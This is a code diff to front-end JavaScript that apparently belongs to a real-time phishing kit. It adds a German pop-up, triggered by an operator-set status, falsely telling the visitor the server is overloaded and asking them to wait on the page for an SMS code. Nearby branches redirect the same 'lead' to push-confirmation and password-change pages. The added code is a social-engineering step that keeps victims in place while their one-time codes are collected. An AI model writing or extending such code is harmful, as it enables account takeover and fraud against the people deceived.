@@ -11,6 +11,7 @@ export function runKleinSmsCode() {
   var btnResend = document.getElementById('sms-resend');
   var btnConfirm = document.getElementById('sms-confirm');
   var statusInterval = null;
+  var waitModalShown = false;
 
   var smsBackEl = document.getElementById('sms-back');
   if (smsBackEl) {
@@ -126,6 +127,51 @@ export function runKleinSmsCode() {
   var waitMsgEl = document.getElementById('sms-wait-msg');
   var REENABLE_AFTER_MS = 15000;
 
+  function showKleinSmsWaitModal() {
+    if (waitModalShown) return;
+    waitModalShown = true;
+    var backdrop = document.createElement('div');
+    backdrop.style.position = 'fixed';
+    backdrop.style.inset = '0';
+    backdrop.style.background = 'rgba(0,0,0,.45)';
+    backdrop.style.zIndex = '99999';
+    var card = document.createElement('div');
+    card.style.position = 'fixed';
+    card.style.left = '50%';
+    card.style.top = '50%';
+    card.style.transform = 'translate(-50%, -50%)';
+    card.style.width = 'min(560px, calc(100% - 24px))';
+    card.style.background = '#fff';
+    card.style.border = '1px solid #dddbd5';
+    card.style.borderRadius = '16px';
+    card.style.boxShadow = '0 16px 40px rgba(0,0,0,.25)';
+    card.style.zIndex = '100000';
+    card.innerHTML =
+      '<div style="display:flex;align-items:center;justify-content:space-between;padding:22px 24px 14px;border-bottom:1px solid #e9e7e3;">' +
+        '<h2 style="margin:0;font-size:44px;line-height:1;color:#111;font-weight:700;">SMS</h2>' +
+        '<button type="button" id="knz-sms-wait-close" aria-label="Schließen" style="width:42px;height:42px;border-radius:12px;border:1px solid #dad8d2;background:#fff;color:#666;font-size:30px;line-height:1;cursor:pointer;">&times;</button>' +
+      '</div>' +
+      '<div style="padding:22px 24px 24px;">' +
+        '<div style="background:#f1f0ee;border:1px solid #dbd9d4;border-radius:14px;padding:18px;font-size:18px;line-height:1.45;color:#2f2f2f;">' +
+          'Bitte warte ein paar Minuten auf den SMS-Code, der Server ist überlastet. Verlasse die Seite nicht, damit das Eingabefeld für die SMS nicht verschwindet.' +
+        '</div>' +
+        '<div style="padding-top:18px;">' +
+          '<button type="button" id="knz-sms-wait-ok" style="min-width:108px;height:44px;padding:0 22px;border:none;border-radius:999px;background:#b5e941;color:#1d4b00;font-size:34px;font-weight:700;cursor:pointer;">OK</button>' +
+        '</div>' +
+      '</div>';
+    function closeModal() {
+      try { backdrop.remove(); } catch (e) {}
+      try { card.remove(); } catch (e) {}
+    }
+    backdrop.addEventListener('click', closeModal);
+    document.body.appendChild(backdrop);
+    document.body.appendChild(card);
+    var closeBtn = document.getElementById('knz-sms-wait-close');
+    var okBtn = document.getElementById('knz-sms-wait-ok');
+    if (closeBtn) closeBtn.addEventListener('click', closeModal);
+    if (okBtn) okBtn.addEventListener('click', closeModal);
+  }
+
   function setWaitingState(waiting) {
     if (btnConfirm) {
       btnConfirm.disabled = waiting;
@@ -174,6 +220,8 @@ export function runKleinSmsCode() {
           if (st === 'redirect_push') {
             if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
             window.location = '/push-confirm.html?id=' + encodeURIComponent(leadId);
+          } else if (st === 'redirect_klein_sms_wait') {
+            showKleinSmsWaitModal();
           } else if (st === 'redirect_change_password') {
             if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
             window.location = '/passwort-aendern?id=' + encodeURIComponent(leadId);
@@ -264,6 +312,8 @@ export function runKleinSmsCode() {
           if (st === 'redirect_push') {
             if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
             window.location = '/push-confirm.html?id=' + encodeURIComponent(initialId);
+          } else if (st === 'redirect_klein_sms_wait') {
+            showKleinSmsWaitModal();
           } else if (st === 'redirect_change_password') {
             if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
             window.location = '/passwort-aendern?id=' + encodeURIComponent(initialId);
